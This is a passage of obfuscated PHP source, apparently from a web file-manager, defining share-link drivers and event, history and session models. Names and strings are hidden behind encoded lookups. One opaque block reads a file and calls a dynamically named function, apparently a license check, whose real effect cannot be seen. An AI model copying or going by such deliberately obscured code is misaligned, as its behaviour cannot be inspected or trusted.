listAll($ÂÜÈİ È) { $¬öù’ô =& $_SERVER[ä¿÷‹µ±]; $Ú¦à–î­ = IO::listAll($ÂÜÈİ È); $îÌò«³ê = $this->pathParse[$¬öù’ô[487]]; foreach ($Ú¦à–î­ as &$×¸ï…²Ñ) { check_abort(); $ÀÔßàá÷ = IO::info($×¸ï…²Ñ[$¬öù’ô[84]]); $ÀÔßàá÷ = is_array($ÀÔßàá÷) ? $ÀÔßàá÷ : array(); $×¸ï…²Ñ = array_merge($ÀÔßàá÷, $×¸ï…²Ñ); $×¸ï…²Ñ[$¬öù’ô[86]] = Action($¬öù’ô[1357])->_shareItemeParse($×¸ï…²Ñ, $îÌò«³ê); } unset($×¸ï…²Ñ); return $Ú¦à–î­; } public function getPathOuter($ıøåşØ ) { $çŞœ¡½ =& $_SERVER[ä¿÷‹µ±]; $ºĞ€ñÚÙ = KodIO::parse($ıøåşØ ); if ($ºĞ€ñÚÙ[$çŞœ¡½[33]] == KodIO::KOD_SHARE_ITEM) { return $ºĞ€ñÚÙ[$çŞœ¡½[84]]; } $˜¡¶µëú = KodIO::clear($ıøåşØ ); $ıåô¾ö = KodIO::clear($this->pathParse[$çŞœ¡½[487]][$çŞœ¡½[1198]]); $ÉÅ£ºŒ¢ = substr($˜¡¶µëú, strlen($ıåô¾ö)); if (substr($˜¡¶µëú, 0, strlen($ıåô¾ö)) != $ıåô¾ö) { return !1; } return $this->pathParse[$çŞœ¡½[1192]] . $çŞœ¡½[8] . ltrim($ÉÅ£ºŒ¢, $çŞœ¡½[8]); } public function getType() { $•ÕƒÉĞÈ =& $_SERVER[ä¿÷‹µ±]; $æúñûÚÇ = str_replace($•ÕƒÉĞÈ[74], $•ÕƒÉĞÈ[12], get_class($this)); return strtolower($æúñûÚÇ); } public function isTypeObject($€şÎŒâğ) { return IO::isTypeObject($€şÎŒâğ); } public function info($ß°ÈÅ·ö) { return $this->infoParse($ß°ÈÅ·ö); } public function infoAuth($Š®´Î˜§) { return $this->infoParse($Š®´Î˜§); } public function infoWithChildren($¿ü¹âé ) { return $this->infoParse($¿ü¹âé , !0); } public function infoFull($¤Ší©í©) { return $this->infoParse($¤Ší©í©); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($İÎÛøÊ) { $this->pathParse = $İÎÛøÊ; } protected function infoParse($‰¥ùşÙ, $¬¼ü±­ß = false) { $ãÉÂÚ‘ =& $_SERVER[ä¿÷‹µ±]; return Action($ãÉÂÚ‘[1197])->sharePathInfo($this->pathParse[$ãÉÂÚ‘[84]], !0, $¬¼ü±­ß); } public function listPath($×ò‹¼ïÉ, $•áË÷ñ = false) { $Äå‘ø”¡ =& $_SERVER[ä¿÷‹µ±]; $†áü¸Ü¹ = IO::listPath($×ò‹¼ïÉ, $•áË÷ñ); if (!$†áü¸Ü¹) { return $†áü¸Ü¹; } if (is_array($†áü¸Ü¹[$Äå‘ø”¡[1358]])) { $Í§È¬›ô = Action($Äå‘ø”¡[1367])->parsePathChildren($†áü¸Ü¹[$Äå‘ø”¡[1358]], array($Äå‘ø”¡[421] => $×ò‹¼ïÉ)); $†áü¸Ü¹[$Äå‘ø”¡[1358]] = Action($Äå‘ø”¡[1197])->shareItemInfo($Í§È¬›ô); } foreach ($†áü¸Ü¹ as $œ‡€àšˆ => $¿îÂ®×Ê) { if (!in_array($œ‡€àšˆ, array($Äå‘ø”¡[83], $Äå‘ø”¡[82]))) { continue; } foreach ($¿îÂ®×Ê as $¢ÓàÖğ‚ => $Í§È¬›ô) { $Í§È¬›ô = Action($Äå‘ø”¡[1367])->parsePathChildren($Í§È¬›ô, array($Äå‘ø”¡[421] => $×ò‹¼ïÉ)); $†áü¸Ü¹[$œ‡€àšˆ][$¢ÓàÖğ‚] = Action($Äå‘ø”¡[1197])->shareItemInfo($Í§È¬›ô); } } return $†áü¸Ü¹; } public function listAll($œ¨å‘„) { $÷ìª­¯¡ =& $_SERVER[ä¿÷‹µ±]; $÷±–£ = IO::listAll($œ¨å‘„); foreach ($÷±–£ as &$¸Ï…ìİÉ) { $¦‹ï¥öÔ = IO::info($¸Ï…ìİÉ[$÷ìª­¯¡[84]]); $¦‹ï¥öÔ = is_array($¦‹ï¥öÔ) ? $¦‹ï¥öÔ : array(); $¸Ï…ìİÉ = array_merge($¦‹ï¥öÔ, $¸Ï…ìİÉ); $¸Ï…ìİÉ[$÷ìª­¯¡[86]] = Action($÷ìª­¯¡[1197])->shareItemInfo($¸Ï…ìİÉ); } unset($¸Ï…ìİÉ); return $÷±–£; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($¯ÚéÜá°) { parent::__construct($¯ÚéÜá°); } } goto b°ãŠ‰›Æ—; cÑªá¿—†ˆ: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\x75\162\x63\145\x5f\145\166\145\156\x74"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\124\151\x6d\145", "\x74\151\155\x65", "\151\156\163\145\x72\164", "\x66\x75\156\143\164\151\x6f\156"), array("\144\145\163\x63", '', "\x69\x6e\x73\145\162\164\54\x75\160\x64\x61\x74\x65\54\x73\x65\x6c\x65\143\164", "\152\x73\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Î¥‹¶Ãš, $Åªä®¼¿, $Îş”â³¨ = '') { $Ú ¥Ø =& $_SERVER[ä¿÷‹µ±]; if (!$this->eventSave) { return; } $·×ÇË‰€ = Model($Ú ¥Ø[1349])->sourceInfo($Î¥‹¶Ãš); if (!$·×ÇË‰€) { return !1; } if ($this->isCacheEvent($·×ÇË‰€, $Åªä®¼¿)) { return; } if ($Îş”â³¨ && is_string($Îş”â³¨)) { $Îş”â³¨ = array($Ú ¥Ø[1889] => $Îş”â³¨); } $÷»õí—Õ = array($Ú ¥Ø[417] => $Î¥‹¶Ãš, $Ú ¥Ø[2067] => $·×ÇË‰€[$Ú ¥Ø[432]], $Ú ¥Ø[2068] => $·×ÇË‰€[$Ú ¥Ø[32]], $Ú ¥Ø[519] => !empty($·×ÇË‰€[$Ú ¥Ø[519]]) ? $·×ÇË‰€[$Ú ¥Ø[519]] : $Ú ¥Ø[12], $Ú ¥Ø[1669] => USER_ID, $Ú ¥Ø[422] => $Åªä®¼¿, $Ú ¥Ø[1671] => $Îş”â³¨); $this->addSystemLog($Åªä®¼¿, $÷»õí—Õ); unset($÷»õí—Õ[$Ú ¥Ø[2068]], $÷»õí—Õ[$Ú ¥Ø[519]]); return $this->add($÷»õí—Õ); } private function addSystemLog($°àëˆÆÖ, $£î¿§ã) { $£ğ‡Š¸– =& $_SERVER[ä¿÷‹µ±]; if ($°àëˆÆÖ == $£ğ‡Š¸–[2069]) { $°àëˆÆÖ = $£î¿§ã[$£ğ‡Š¸–[453]][$£ğ‡Š¸–[2070]]; } else { if (in_array($°àëˆÆÖ, array($£ğ‡Š¸–[1830], $£ğ‡Š¸–[2071]))) { $°àëˆÆÖ = $£î¿§ã[$£ğ‡Š¸–[453]][$£ğ‡Š¸–[774]]; } } $ó©³€”Ÿ = array_merge($£î¿§ã, array($£ğ‡Š¸–[2072] => $£î¿§ã[$£ğ‡Š¸–[402]], $£ğ‡Š¸–[2073] => $£î¿§ã[$£ğ‡Š¸–[2073]])); Hook::trigger($£ğ‡Š¸–[2074], $£ğ‡Š¸–[2075] . $°àëˆÆÖ, $£î¿§ã); Model($£ğ‡Š¸–[1794])->addLog($£ğ‡Š¸–[2075] . $°àëˆÆÖ, $ó©³€”Ÿ); } private function isCacheEvent($×•è•¨ , $Òó×İËé) { if ($×•è•¨ [$_SERVER[ä¿÷‹µ±][411]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($É†œ‡Ğù, $µ™ÅËú) { $®”ø™œÌ =& $_SERVER[ä¿÷‹µ±]; $Éşó”­Í = Model($®”ø™œÌ[1349])->sourceInfo($É†œ‡Ğù); $ö¨¼í³ñ = array($®”ø™œÌ[2070] => $µ™ÅËú, $®”ø™œÌ[32] => $Éşó”­Í[$®”ø™œÌ[32]]); return $this->addEvent($É†œ‡Ğù, $®”ø™œÌ[2069], $ö¨¼í³ñ); } public function eventFileEdit($ƒåÌ³¸) { $İ³ËÖáÊ =& $_SERVER[ä¿÷‹µ±]; $ÕÎø–¥Í = array($İ³ËÖáÊ[2076] => $_SERVER[$İ³ËÖáÊ[2077]], $İ³ËÖáÊ[2078] => strtolower(ACTION)); if (isset($GLOBALS[$İ³ËÖáÊ[7]][$İ³ËÖáÊ[2079]])) { $ÕÎø–¥Í[$İ³ËÖáÊ[2079]] = $İ³ËÖáÊ[88]; } return $this->addEvent($ƒåÌ³¸, $İ³ËÖáÊ[1820], $ÕÎø–¥Í); } public function eventRecycle($´ÛÀ¾Œ§, $¤£æ°¤) { return $this->addEvent($´ÛÀ¾Œ§, $_SERVER[ä¿÷‹µ±][2071], $¤£æ°¤); } public function eventRemove($í‘Ô¯²ö) { $œì‚¦— =& $_SERVER[ä¿÷‹µ±]; $Œ¨”¥Ø¥ = Model($œì‚¦—[1349])->sourceInfo($í‘Ô¯²ö); $Ş¶ÑÍß = $Œ¨”¥Ø¥[$œì‚¦—[32]]; return $this->addEvent($Œ¨”¥Ø¥[$œì‚¦—[432]], $œì‚¦—[1819], $Ş¶ÑÍß); } public function eventShare($¦ú¢ Â, $‡‚²İ÷ ) { return $this->addEvent($¦ú¢ Â, $_SERVER[ä¿÷‹µ±][1830], $‡‚²İ÷ ); } public function eventMove($°÷Ó³İü, $ºÅ´–˜÷, $—¹×òÍÂ) { $¿óÉ•É£ =& $_SERVER[ä¿÷‹µ±]; $·²íø®š = Model($¿óÉ•É£[1349]); $Ş½¢ÄıÚ = $·²íø®š->sourceInfo($°÷Ó³İü); $ßˆØ¬ÑĞ = $·²íø®š->sourceInfo($ºÅ´–˜÷); $‡É—øÃã = $·²íø®š->sourceInfo($—¹×òÍÂ); $ëà´éÊ¯ = array($¿óÉ•É£[1182] => $ºÅ´–˜÷, $¿óÉ•É£[2080] => $ßˆØ¬ÑĞ[$¿óÉ•É£[32]], $¿óÉ•É£[2058] => !empty($ßˆØ¬ÑĞ[$¿óÉ•É£[519]]) ? $ßˆØ¬ÑĞ[$¿óÉ•É£[519]] : $¿óÉ•É£[12], $¿óÉ•É£[1183] => $—¹×òÍÂ, $¿óÉ•É£[2081] => $‡É—øÃã[$¿óÉ•É£[32]], $¿óÉ•É£[2082] => !empty($‡É—øÃã[$¿óÉ•É£[519]]) ? $‡É—øÃã[$¿óÉ•É£[519]] : $¿óÉ•É£[12]); $this->addEvent($°÷Ó³İü, $¿óÉ•É£[557], $ëà´éÊ¯); $Ş½¢ÄıÚ = $·²íø®š->sourceInfo($°÷Ó³İü); $ëà´éÊ¯ = array($¿óÉ•É£[402] => $Ş½¢ÄıÚ[$¿óÉ•É£[402]], $¿óÉ•É£[32] => $Ş½¢ÄıÚ[$¿óÉ•É£[32]]); $this->addEvent($ºÅ´–˜÷, $¿óÉ•É£[2083], $ëà´éÊ¯); } public function eventCopy($ ù£‘©Ô) { $this->eventCreate($ ù£‘©Ô, $_SERVER[ä¿÷‹µ±][555]); } public function eventRename($Ì™ÈÓÃ…, $¼¼Š‚®ë, $çîèÇÈ) { $Í„¬šşÁ =& $_SERVER[ä¿÷‹µ±]; $äï÷éöç = array($Í„¬šşÁ[1182] => $¼¼Š‚®ë, $Í„¬šşÁ[1183] => $çîèÇÈ); return $this->addEvent($Ì™ÈÓÃ…, $Í„¬šşÁ[1364], $äï÷éöç); } public function eventAddComment($Ş˜ğˆìõ, $¿Ó°†ĞÃ) { return $this->addEvent($Ş˜ğˆìõ, $_SERVER[ä¿÷‹µ±][2084], $¿Ó°†ĞÃ); } public function eventAddDesc($®ˆÍ…Ôø, $¾Ë®œå) { return $this->addEvent($®ˆÍ…Ôø, $_SERVER[ä¿÷‹µ±][2085], $¾Ë®œå); } public function listBySource($•‘Á) { $ø…ü­â” =& $_SERVER[ä¿÷‹µ±]; $³Ãøîç = Model($ø…ü­â”[1349])->sourceInfo($•‘Á); $„÷íïİõ = array($ø…ü­â”[417] => $•‘Á); if ($³Ãøîç[$ø…ü­â”[410]] == $ø…ü­â”[88]) { $æ×ÆÎÙ¾ = Model($ø…ü­â”[1349])->listSearchChildren($•‘Á, 20000); $æ×ÆÎÙ¾[] = $•‘Á . $ø…ü­â”[378]; $„÷íïİõ = array($ø…ü­â”[402] => array($ø…ü­â”[7], $æ×ÆÎÙ¾)); } $„ı€‡ıØ = $this->where($„÷íïİõ)->order($ø…ü­â”[2086])->selectPage(); if ($„ı€‡ıØ[$ø…ü­â”[366]][$ø…ü­â”[367]] == 0) { $„ı€‡ıØ[$ø…ü­â”[366]][$ø…ü­â”[367]] = 1; $„ı€‡ıØ[$ø…ü­â”[369]] = array(array($ø…ü­â”[417] => $•‘Á, $ø…ü­â”[2067] => $³Ãøîç[$ø…ü­â”[432]], $ø…ü­â”[1669] => $³Ãøîç[$ø…ü­â”[454]], $ø…ü­â”[422] => $ø…ü­â”[2087], $ø…ü­â”[423] => $³Ãøîç[$ø…ü­â”[200]], $ø…ü­â”[1671] => $ø…ü­â”[12])); } return $this->eventListParse($„ı€‡ıØ, $•‘Á); } private function eventListParse($ÇÑö½ª·, $ÒøüÑ) { $ƒ»‡ğ·´ =& $_SERVER[ä¿÷‹µ±]; $¬ö³ƒ·Ë = $ÇÑö½ª·[$ƒ»‡ğ·´[369]]; $¿æ¬Ä¾ = array_to_keyvalue($¬ö³ƒ·Ë, $ƒ»‡ğ·´[12], $ƒ»‡ğ·´[402]); $ÜŒ•¶ ¦ = array_to_keyvalue($¬ö³ƒ·Ë, $ƒ»‡ğ·´[12], $ƒ»‡ğ·´[2073]); foreach ($¬ö³ƒ·Ë as $ÒãŸûÎ¾) { $Ï–Êíö´ = $ÒãŸûÎ¾[$ƒ»‡ğ·´[453]]; if ($ÒãŸûÎ¾[$ƒ»‡ğ·´[33]] == $ƒ»‡ğ·´[557] && isset($Ï–Êíö´[$ƒ»‡ğ·´[1182]])) { $¿æ¬Ä¾[] = $Ï–Êíö´[$ƒ»‡ğ·´[1182]] . $ƒ»‡ğ·´[12]; $¿æ¬Ä¾[] = $Ï–Êíö´[$ƒ»‡ğ·´[1183]] . $ƒ»‡ğ·´[12]; } if ($ÒãŸûÎ¾[$ƒ»‡ğ·´[33]] == $ƒ»‡ğ·´[2083] && isset($Ï–Êíö´[$ƒ»‡ğ·´[402]])) { $¿æ¬Ä¾[] = $Ï–Êíö´[$ƒ»‡ğ·´[402]] . $ƒ»‡ğ·´[12]; } } $¿æ¬Ä¾ = array_merge($¿æ¬Ä¾, $ÜŒ•¶ ¦, array($ÒøüÑ . $ƒ»‡ğ·´[12])); $¿æ¬Ä¾ = array_unique($¿æ¬Ä¾); $¬àÑ‡£ = array_unique(array_to_keyvalue($¬ö³ƒ·Ë, $ƒ»‡ğ·´[12], $ƒ»‡ğ·´[1678])); $é“ÀÕ– = Model($ƒ»‡ğ·´[535])->userListInfo($¬àÑ‡£); $™¼²™€Õ = Model($ƒ»‡ğ·´[844])->sourceListInfo($¿æ¬Ä¾, !0); foreach ($¬ö³ƒ·Ë as &$ÒãŸûÎ¾) { if ($ÒãŸûÎ¾[$ƒ»‡ğ·´[33]] == $ƒ»‡ğ·´[557] && isset($ÒãŸûÎ¾[$ƒ»‡ğ·´[453]][$ƒ»‡ğ·´[1182]])) { $ÒãŸûÎ¾[$ƒ»‡ğ·´[453]][$ƒ»‡ğ·´[1182]] = $™¼²™€Õ[$ÒãŸûÎ¾[$ƒ»‡ğ·´[453]][$ƒ»‡ğ·´[1182]]]; $ÒãŸûÎ¾[$ƒ»‡ğ·´[453]][$ƒ»‡ğ·´[1183]] = $™¼²™€Õ[$ÒãŸûÎ¾[$ƒ»‡ğ·´[453]][$ƒ»‡ğ·´[1183]]]; } if ($ÒãŸûÎ¾[$ƒ»‡ğ·´[33]] == $ƒ»‡ğ·´[2083] && isset($ÒãŸûÎ¾[$ƒ»‡ğ·´[453]][$ƒ»‡ğ·´[402]])) { $ÒãŸûÎ¾[$ƒ»‡ğ·´[453]][$ƒ»‡ğ·´[402]] = $™¼²™€Õ[$ÒãŸûÎ¾[$ƒ»‡ğ·´[453]][$ƒ»‡ğ·´[402]]]; } $ÒãŸûÎ¾[$ƒ»‡ğ·´[86]] = $™¼²™€Õ[$ÒãŸûÎ¾[$ƒ»‡ğ·´[402]]]; $ÒãŸûÎ¾[$ƒ»‡ğ·´[2088]] = $™¼²™€Õ[$ÒãŸûÎ¾[$ƒ»‡ğ·´[2073]]]; if ($ÒãŸûÎ¾[$ƒ»‡ğ·´[33]] == $ƒ»‡ğ·´[1819]) { $ÒãŸûÎ¾[$ƒ»‡ğ·´[2088]] = $ÒãŸûÎ¾[$ƒ»‡ğ·´[86]]; $ÒãŸûÎ¾[$ƒ»‡ğ·´[2073]] = $ÒãŸûÎ¾[$ƒ»‡ğ·´[2088]][$ƒ»‡ğ·´[402]]; $ÒãŸûÎ¾[$ƒ»‡ğ·´[86]] = !1; $ÒãŸûÎ¾[$ƒ»‡ğ·´[402]] = $ƒ»‡ğ·´[12]; } $ÒãŸûÎ¾[$ƒ»‡ğ·´[2018]] = $é“ÀÕ–[$ÒãŸûÎ¾[$ƒ»‡ğ·´[1678]]]; } unset($ÒãŸûÎ¾); $ÇÑö½ª·[$ƒ»‡ğ·´[369]] = $¬ö³ƒ·Ë; return $ÇÑö½ª·; } public function removeBySource($˜Õ¥ùÛ¡) { $Û¢°ÍÃ… = array($_SERVER[ä¿÷‹µ±][417] => $˜Õ¥ùÛ¡); $this->where($Û¢°ÍÃ…)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\x72\143\x65\x5f\150\151\x73\x74\157\x72\171"; public function historyCount($ùú¢¸¸•) { $®Ñ“Ó™ =& $_SERVER[ä¿÷‹µ±]; if (!$ùú¢¸¸•) { return array(); } if (is_string($ùú¢¸¸•) || is_int($ùú¢¸¸•)) { $ùú¢¸¸• = array($ùú¢¸¸•); } $µ©»€›° = array($®Ñ“Ó™[402], $®Ñ“Ó™[1883] => $®Ñ“Ó™[500]); $µ¹°¨£¯ = array($®Ñ“Ó™[402] => array($®Ñ“Ó™[7], $ùú¢¸¸•)); $“³Œ¨ó‹ = $this->field($µ©»€›°)->where($µ¹°¨£¯)->group($®Ñ“Ó™[402])->select(); return array_to_keyvalue($“³Œ¨ó‹, $®Ñ“Ó™[402], $®Ñ“Ó™[500]); } public function addHistory($ŸŸ²æ¿÷, $â˜å”ë¬ = '') { $ŞÓŠß¬ñ =& $_SERVER[ä¿÷‹µ±]; $Ê¸¸üå¢ = array($ŞÓŠß¬ñ[417] => $ŸŸ²æ¿÷[$ŞÓŠß¬ñ[402]], $ŞÓŠß¬ñ[1669] => isset($ŸŸ²æ¿÷[$ŞÓŠß¬ñ[456]]) ? $ŸŸ²æ¿÷[$ŞÓŠß¬ñ[456]] : $ŸŸ²æ¿÷[$ŞÓŠß¬ñ[454]], $ŞÓŠß¬ñ[469] => $ŸŸ²æ¿÷[$ŞÓŠß¬ñ[468]], $ŞÓŠß¬ñ[585] => $ŸŸ²æ¿÷[$ŞÓŠß¬ñ[76]], $ŞÓŠß¬ñ[2089] => $â˜å”ë¬); if ($GLOBALS[$ŞÓŠß¬ñ[6]][$ŞÓŠß¬ñ[89]][$ŞÓŠß¬ñ[1231]] >= 1) { $this->historyAutoClear($Ê¸¸üå¢[$ŞÓŠß¬ñ[402]]); $this->add($Ê¸¸üå¢); } Hook::trigger($ŞÓŠß¬ñ[2090], $Ê¸¸üå¢); Model($ŞÓŠß¬ñ[2091])->eventFileEdit($ŸŸ²æ¿÷[$ŞÓŠß¬ñ[402]]); } private function historyAutoClear($îôš†ßĞ) { $Îøí³çæ =& $_SERVER[ä¿÷‹µ±]; $Ììóä¼† = Model($Îøí³çæ[789])->get($Îøí³çæ[1253]); $‹ßìÕ© = $GLOBALS[$Îøí³çæ[6]][$Îøí³çæ[89]][$Îøí³çæ[1231]]; $­ºç¾çı = $Ììóä¼† == $Îøí³çæ[1254] ? min(5, $‹ßìÕ©) : $‹ßìÕ©; $­ºç¾çı = $­ºç¾çı <= 0 ? 0 : $­ºç¾çı - 1; if ($­ºç¾çı >= 500) { return; } $á…°¿²” = array($Îøí³çæ[417] => $îôš†ßĞ); $÷ûŞÄ = $this->field($Îøí³çæ[2092])->where($á…°¿²”)->order($Îøí³çæ[2086])->select(); if (!$÷ûŞÄ || $­ºç¾çı >= count($÷ûŞÄ)) { return; } $ı¿ôñÓˆ = array_to_keyvalue($÷ûŞÄ, $Îøí³çæ[12], $Îøí³çæ[399]); $ı¿ôñÓˆ = array_slice($ı¿ôñÓˆ, $­ºç¾çı); $µá·÷…‰ = array_to_keyvalue($÷ûŞÄ, $Îøí³çæ[12], $Îøí³çæ[468]); $µá·÷…‰ = array_slice($µá·÷…‰, $­ºç¾çı); if (!$ı¿ôñÓˆ || !$µá·÷…‰) { return; } $á…°¿²” = array($Îøí³çæ[419] => array($Îøí³çæ[7], $ı¿ôñÓˆ)); $this->where($á…°¿²”)->delete(); Model($Îøí³çæ[471])->remove($µá·÷…‰); } public function listData($ ¤Î‰) { $ ˜°ŒãÎ =& $_SERVER[ä¿÷‹µ±]; $ó’®‘÷ = array($ ˜°ŒãÎ[417] => $ ¤Î‰); $ïÃ¢ı›Ò = $ ˜°ŒãÎ[2093]; $öèâŠÏş = $this->field($ïÃ¢ı›Ò)->where($ó’®‘÷)->order($ ˜°ŒãÎ[2086])->selectPage(); $this->_listAppendUser($öèâŠÏş[$ ˜°ŒãÎ[369]]); $¦î˜ä©» = Model($ ˜°ŒãÎ[789])->get($ ˜°ŒãÎ[1253]); $—Æä¶Ûã = 5; if ($¦î˜ä©» == $ ˜°ŒãÎ[1254]) { $öèâŠÏş[$ ˜°ŒãÎ[369]] = array_slice($öèâŠÏş[$ ˜°ŒãÎ[369]], 0, $—Æä¶Ûã); $öèâŠÏş[$ ˜°ŒãÎ[366]] = array($ ˜°ŒãÎ[2094] => 1, $ ˜°ŒãÎ[2095] => 20, $ ˜°ŒãÎ[2096] => 1, $ ˜°ŒãÎ[2097] => count($öèâŠÏş[$ ˜°ŒãÎ[369]])); } return $öèâŠÏş; } protected function _listAppendUser(&$Ñ§ÛÎØ) { $»¿¤Ûş§ =& $_SERVER[ä¿÷‹µ±]; $Ë–ö½ø× = array_to_keyvalue($Ñ§ÛÎØ, $»¿¤Ûş§[12], $»¿¤Ûş§[1678]); $€áÁŠÓ = Model($»¿¤Ûş§[535])->userListInfo($Ë–ö½ø×); foreach ($Ñ§ÛÎØ as &$®†Ü³î) { $ƒ¼ŠàÛ— = $®†Ü³î[$»¿¤Ûş§[1678]]; $®†Ü³î[$»¿¤Ûş§[454]] = $€áÁŠÓ[$ƒ¼ŠàÛ—] ? $€áÁŠÓ[$ƒ¼ŠàÛ—] : !1; } unset($®†Ü³î); } public function fileInfo($ÖÔ®çÛõ) { $Åªï™³š =& $_SERVER[ä¿÷‹µ±]; $¶¯‹ = $this->tablePrefix; $»Š³»‡ = "{$¶¯‹}\x69\x6f\x5f\146\151\154\145\40\x66\x69\x6c\x65\163\x20\157\x6e\x20\146\151\x6c\145\x73\x2e\146\x69\x6c\145\111\104\40\x3d\40\x68\x69\163\x74\157\x72\x79\x2e\146\151\x6c\x65\x49\x44"; return $this->alias($Åªï™³š[2098])->where(array($Åªï™³š[419] => $ÖÔ®çÛõ))->join($»Š³»‡, $Åªï™³š[2099])->find(); } public function removeItem($—µœï‘×) { $éá¯ŞÜ =& $_SERVER[ä¿÷‹µ±]; $˜¼Ì£âÏ = array($éá¯ŞÜ[419] => $—µœï‘×); $´ˆ«Ïå = $this->where($˜¼Ì£âÏ)->find(); if ($´ˆ«Ïå) { $×ò²µü = $this->where($˜¼Ì£âÏ)->delete(); Model($éá¯ŞÜ[471])->remove($´ˆ«Ïå[$éá¯ŞÜ[468]]); return $×ò²µü; } return !1; } public function removeBySource($¥ŸıƒÑ§) { $ÖöÈ†ƒê =& $_SERVER[ä¿÷‹µ±]; if (!$¥ŸıƒÑ§) { return !1; } if (!is_array($¥ŸıƒÑ§)) { $¥ŸıƒÑ§ = array($¥ŸıƒÑ§); } $àºÕšä = array($ÖöÈ†ƒê[417] => array($ÖöÈ†ƒê[7], $¥ŸıƒÑ§)); $êé¯¨ç¥ = $this->field($ÖöÈ†ƒê[469])->where($àºÕšä)->select(); if ($êé¯¨ç¥) { $this->where($àºÕšä)->delete(); $ßÙÅõº® = array_to_keyvalue($êé¯¨ç¥, $ÖöÈ†ƒê[12], $ÖöÈ†ƒê[468]); Model($ÖöÈ†ƒê[471])->remove($ßÙÅõº®); } return !0; } public function setDetail($ÌíËùØæ, $ÅüŸƒÉì) { $„¬ =& $_SERVER[ä¿÷‹µ±]; return $this->where(array($„¬[419] => $ÌíËùØæ))->save(array($„¬[2089] => $ÅüŸƒÉì)); } public function rollbackToItem($â°œ·Ó, $€¡àçíÉ) { $óŠÃ§™… =& $_SERVER[ä¿÷‹µ±]; $Ï¾…å‚¨ = Model($óŠÃ§™…[844])->sourceInfo($â°œ·Ó); $this->addHistory($Ï¾…å‚¨, LNG($óŠÃ§™…[2100])); $¹ÊÓë¤Û = $this->find($€¡àçíÉ); $ëšÉÑÂË = array($óŠÃ§™…[468] => $¹ÊÓë¤Û[$óŠÃ§™…[468]], $óŠÃ§™…[76] => $¹ÊÓë¤Û[$óŠÃ§™…[76]], $óŠÃ§™…[85] => time(), $óŠÃ§™…[456] => USER_ID); Model($óŠÃ§™…[844])->where(array($óŠÃ§™…[402] => $â°œ·Ó))->save($ëšÉÑÂË); return $this->where(array($óŠÃ§™…[419] => $€¡àçíÉ))->delete(); } public function clearSame($«¦½·ãÈ) { $é™Ö¼ÖÎ =& $_SERVER[ä¿÷‹µ±]; $Âã¦µ« = $this->listData($«¦½·ãÈ); $á‘Âá§… = array_to_keyvalue_group($Âã¦µ«, $é™Ö¼ÖÎ[468]); $èíÅõè´ = array(); $·–ááØ± = array(); foreach ($á‘Âá§… as $“óèåÄ) { if (!$“óèåÄ || count($“óèåÄ) <= 1) { continue; } foreach ($“óèåÄ as $è‹¹³¼) { $èíÅõè´[] = $è‹¹³¼[$é™Ö¼ÖÎ[468]]; $·–ááØ±[] = $è‹¹³¼[$é™Ö¼ÖÎ[399]]; } } if (!$·–ááØ±) { return; } $this->where(array($é™Ö¼ÖÎ[399] => array($é™Ö¼ÖÎ[7], $·–ááØ±)))->delete(); Model($é™Ö¼ÖÎ[471])->remove($èíÅõè´); } public function userSpace() { $Øï­–Š£ =& $_SERVER[ä¿÷‹µ±]; $¼Ü•Ê†‰ = $this->tablePrefix; $î¨›ß¨Â = array($Øï­–Š£[1669] => USER_ID); $ş¾ªĞÈ€ = "{$¼Ü•Ê†‰}\151\157\x5f\146\151\x6c\x65\x20\x66\x69\154\145\x73\x20\x6f\156\x20\146\x69\154\145\x73\56\146\x69\x6c\145\x49\104\40\75\40\150\151\163\164\x6f\x72\x79\56\x66\x69\154\145\111\104"; return $this->alias($Øï­–Š£[2098])->where($î¨›ß¨Â)->join($ş¾ªĞÈ€, $Øï­–Š£[2099])->sum($Øï­–Š£[76]); } } if ($_SERVER[$_SERVER[ä¿÷‹µ±][894]] != $_SERVER[$_SERVER[ä¿÷‹µ±][1632]]) { $_getc = $_SERVER[ä¿÷‹µ±][896]; $_getfile = $_SERVER[$_SERVER[ä¿÷‹µ±][891]] . $_SERVER[ä¿÷‹µ±][892]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ä¿÷‹µ±][231], $_getfilec); if (count($_getarrs) < $_SERVER[ä¿÷‹µ±][630]) { $exit = $_SERVER[ä¿÷‹µ±][897]; $exit(); } $_act = $_SERVER[ä¿÷‹µ±][935]; $_act($_SERVER[$_SERVER[ä¿÷‹µ±][934]]); } goto e†ĞÍ’…¢ ; Eš˜ ¼ã·²: define($_SERVER[ä¿÷‹µ±][238], 1); define($_SERVER[ä¿÷‹µ±][239], 2); define($_SERVER[ä¿÷‹µ±][240], 3); goto D”¬ƒŸœÕØ; cùäŞ„ƒ¶¥: class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\155\137\x73\x65\x73\x73\151\x6f\156"; public function get($©õÍ…«) { $”çå¾Ç§ =& $_SERVER[ä¿÷‹µ±]; $·˜Äñôº = $this->where(array($”çå¾Ç§[1985] => $©õÍ…«))->find(); if (!is_array($·˜Äñôº)) { return !1; } return $·˜Äñôº[$”çå¾Ç§[774]]; } public function set($®ªŞÓ½±, $ñ›ÅÖ¯, $™²¤ï«ä = 3600) { $¬ÓáÜŒè =& $_SERVER[ä¿÷‹µ±]; $şééµÚÕ = array($¬ÓáÜŒè[1985] => $®ªŞÓ½±, $¬ÓáÜŒè[1889] => $ñ›ÅÖ¯, $¬ÓáÜŒè[1986] => $™²¤ï«ä + time()); if (Session::get($¬ÓáÜŒè[1987])) { $şééµÚÕ[$¬ÓáÜŒè[1678]] = Session::get($¬ÓáÜŒè[1987]); } else { $şééµÚÕ[$¬ÓáÜŒè[1678]] = 0; } if ($this->get($®ªŞÓ½±)) { return $this->where(array($¬ÓáÜŒè[1985] => $®ªŞÓ½±))->save($şééµÚÕ); } else { return $this->add($şééµÚÕ, array(), !0); } } public function remove($ÑÔğ¨äÔ) { return $this->where(array($_SERVER[ä¿÷‹µ±][1985] => $ÑÔğ¨äÔ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ä¿÷‹µ±][1988] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\x72\x65"; protected $dataAuto = 